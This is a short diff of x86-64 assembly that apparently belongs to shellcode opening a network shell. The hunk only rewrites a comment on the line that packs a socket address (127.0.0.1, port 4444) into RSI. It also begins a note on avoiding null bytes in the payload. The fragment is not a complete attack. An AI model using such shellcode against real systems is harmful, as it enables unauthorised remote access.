@@ -32,7 +32,7 @@ _main:
 	; Build the structure - Set IP & Port Here!
 
 	xor rsi, rsi 					; zero out RSI
-	mov rsi, 0x0100007f5c110200 ; IP = 127.0.0.1 (7f000001), Port = 4444 (115c), AF_INET = 02, Len = 00
+	mov rsi, 0x0100007f5c110200 ; IP = 127.0.0.1 (7f000001), Port = 4444 (115c), AF_INET = 2 (02), Len = 0 (00)
 
 	; In the above instruction we will have null bytes, although theres a few things we can do
 	; 1) mov rsi, 0x0100007f
